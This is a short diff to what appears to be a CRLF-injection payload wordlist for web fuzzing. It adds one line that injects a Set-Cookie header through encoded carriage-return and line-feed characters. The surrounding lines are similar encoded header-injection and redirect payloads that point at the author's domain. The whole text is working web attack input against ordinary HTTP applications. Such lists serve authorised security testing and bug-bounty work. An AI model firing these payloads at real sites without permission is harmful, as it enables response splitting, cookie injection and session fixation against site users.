@@ -58,3 +58,4 @@ crlf%0D%0A%09crlfi:karthithehacker
 %u000Acrlfi:karthithehacker
 //www.karthithehacker.com/%2F%2E%2E%0D%0Acrlfi:karthithehacker
 /www.karthithehacker.com
+%0D%0ASet-Cookie:karthithehacker=karthitehacker
